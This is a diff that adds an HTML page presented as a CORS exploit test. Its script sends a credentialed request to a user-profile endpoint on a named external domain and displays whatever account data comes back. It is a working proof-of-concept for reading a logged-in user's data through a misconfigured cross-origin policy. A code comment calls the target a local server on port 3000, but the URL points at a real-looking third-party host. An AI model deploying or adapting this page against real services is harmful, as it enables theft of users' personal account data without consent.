@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Localhost CORS Exploit Test</title>
+    <style>
+        body { font-family: sans-serif; margin: 30px; background: #f4f4f9; }
+        .container { max-width: 600px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        button { background: #ff4757; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #ff6b81; }
+        pre { background: #2f3542; color: #ced6e0; padding: 15px; border-radius: 4px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>CORS Exploit Test Payload</h2>
+    <p>This script will attempt to read data from the target API server across ports.</p>
+    
+    <button id="runExploit">Trigger CORS Fetch</button>
+
+    <h3>Response Output:</h3>
+    <pre id="output">Click the button to send the request...</pre>
+</div>
+
+<script>
+    document.getElementById('runExploit').addEventListener('click', () => {
+        const outputDiv = document.getElementById('output');
+        outputDiv.innerText = "Sending request...";
+
+        // Target your local API server (assumed to be running on port 3000)
+        fetch('https://ocean.medishout.co.uk/v1/users/me/?platform=web', {
+            method: 'GET',
+            credentials: 'include' // Instructs the browser to attempt to attach cookies
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+            // If successful, the misconfigured CORS header allowed us to read the data
+            outputDiv.style.color = "#2ed573";
+            outputDiv.innerText = JSON.stringify(data, null, 2);
+        })
+        .catch(err => {
+            // If it fails, the browser blocked it or the cookie was missing
+            outputDiv.style.color = "#ff4757";
+            outputDiv.innerText = "Exploit Failed / Blocked.\nDetails: " + err.message;
+        });
+    });
+</script>
+
+</body>
+</html>
